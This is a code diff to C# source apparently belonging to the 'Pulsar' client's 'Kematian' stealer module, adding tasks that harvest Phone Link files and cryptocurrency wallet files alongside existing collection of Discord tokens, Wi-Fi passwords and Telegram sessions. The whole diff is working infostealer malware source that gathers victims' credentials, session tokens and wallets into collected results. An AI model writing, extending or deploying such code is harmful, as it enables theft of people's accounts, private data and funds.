@@ -3,6 +3,8 @@ using Pulsar.Client.Kematian.Discord;
 using Pulsar.Client.Kematian.Wifi;
 using Pulsar.Client.Kematian.Telegram;
 using Pulsar.Client.Kematian.Games;
+using Pulsar.Client.Kematian.PhoneLink;
+using Pulsar.Client.Kematian.CryptoWallets;
 using System;
 using System.Diagnostics;
 using System.Collections.Concurrent;
@@ -68,7 +70,8 @@ namespace Pulsar.Client.Kematian
                     {
                         new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord/tokens.txt"),
                         new KeyValuePair<Func<string>, string>(GetWifis.Passwords, "Wifi/Wifi.txt"),
-                        new KeyValuePair<Func<string>, string>(TelegramRetriever.GetTelegramSessions, "Telegram/sessions.txt")
+                        new KeyValuePair<Func<string>, string>(TelegramRetriever.GetTelegramSessions, "Telegram/sessions.txt"),
+                        new KeyValuePair<Func<string>, string>(PhoneLinkRetriever.GetPhoneLinkStatus, "PhoneLink/status.txt")
                     };
 
                     var browserMethodGenerators = new Dictionary<string, Func<string, KeyValuePair<Func<string>, string>[]>>
@@ -96,7 +99,7 @@ namespace Pulsar.Client.Kematian
                         {
                             totalTasks += browserMethodGenerators["Methods"](browser.Key).Length;
                         }
-                        totalTasks += 2; // tg, games
+                        totalTasks += 4; // tg, games, phonelink, cryptowallets
                         
                         progress?.Report(0);
                         
@@ -271,6 +274,71 @@ namespace Pulsar.Client.Kematian
                         
                         taskList.Add(telegramTask);
 
+                        var phoneLinkTask = Task.Run(() =>
+                        {
+                            try
+                            {
+                                cancellationToken.ThrowIfCancellationRequested();
+                                
+                                if (semaphore.Wait(50, cancellationToken))
+                                {
+                                    try
+                                    {
+                                        cancellationToken.ThrowIfCancellationRequested();
+                                        
+                                        var phoneLinkFiles = PhoneLinkRetriever.GetPhoneLinkFiles();
+                                        foreach (var file in phoneLinkFiles)
+                                        {
+                                            if (cancellationToken.IsCancellationRequested)
+                                                break;
+
+                                            entryResults.Add(new Tuple<string, byte[]>(file.Key, file.Value));
+                                        }
+                                    }
+                                    finally
+                                    {
+                                        try { semaphore.Release(); } catch { }
+                                        
+                                        if (!cancellationToken.IsCancellationRequested)
+                                        {
+                                            int completed = Interlocked.Increment(ref completedTasks);
+                                            try
+                                            {
+                                                int percentage = (int)((double)completed / totalTasks * 100);
+                                                progress?.Report(percentage);
+                                            }
+                                            catch { }
+                                        }
+                                    }
+                                }
+                            }
+                            catch (OperationCanceledException)
+                            {
+
+                            }
+                            catch (ObjectDisposedException)
+                            {
+
+                            }
+                            catch (Exception ex)
+                            {
+                                Debug.WriteLine($"Error processing Phone Link files: {ex.Message}");
+                                
+                                if (!cancellationToken.IsCancellationRequested)
+                                {
+                                    try
+                                    {
+                                        int completed = Interlocked.Increment(ref completedTasks);
+                                        int percentage = (int)((double)completed / totalTasks * 100);
+                                        progress?.Report(percentage);
+                                    }
+                                    catch { }
+                                }
+                            }
+                        }, cancellationToken);
+                        
+                        taskList.Add(phoneLinkTask);
+
                         var gamesTask = Task.Run(() =>
                         {
                             try
@@ -335,6 +403,71 @@ namespace Pulsar.Client.Kematian
                         }, cancellationToken);
                         
                         taskList.Add(gamesTask);
+
+                        var cryptoWalletsTask = Task.Run(() =>
+                        {
+                            try
+                            {
+                                cancellationToken.ThrowIfCancellationRequested();
+                                
+                                if (semaphore.Wait(50, cancellationToken))
+                                {
+                                    try
+                                    {
+                                        cancellationToken.ThrowIfCancellationRequested();
+                                        
+                                        var walletFiles = CryptoWalletRetriever.GetCryptoWalletFiles();
+                                        foreach (var file in walletFiles)
+                                        {
+                                            if (cancellationToken.IsCancellationRequested)
+                                                break;
+
+                                            entryResults.Add(new Tuple<string, byte[]>($"CryptoWallets/{file.Key}", file.Value));
+                                        }
+                                    }
+                                    finally
+                                    {
+                                        try { semaphore.Release(); } catch { }
+                                        
+                                        if (!cancellationToken.IsCancellationRequested)
+                                        {
+                                            int completed = Interlocked.Increment(ref completedTasks);
+                                            try
+                                            {
+                                                int percentage = (int)((double)completed / totalTasks * 100);
+                                                progress?.Report(percentage);
+                                            }
+                                            catch { }
+                                        }
+                                    }
+                                }
+                            }
+                            catch (OperationCanceledException)
+                            {
+
+                            }
+                            catch (ObjectDisposedException)
+                            {
+
+                            }
+                            catch (Exception ex)
+                            {
+                                Debug.WriteLine($"Error processing crypto wallet files: {ex.Message}");
+                                
+                                if (!cancellationToken.IsCancellationRequested)
+                                {
+                                    try
+                                    {
+                                        int completed = Interlocked.Increment(ref completedTasks);
+                                        int percentage = (int)((double)completed / totalTasks * 100);
+                                        progress?.Report(percentage);
+                                    }
+                                    catch { }
+                                }
+                            }
+                        }, cancellationToken);
+                        
+                        taskList.Add(cryptoWalletsTask);
 
                         try
                         {
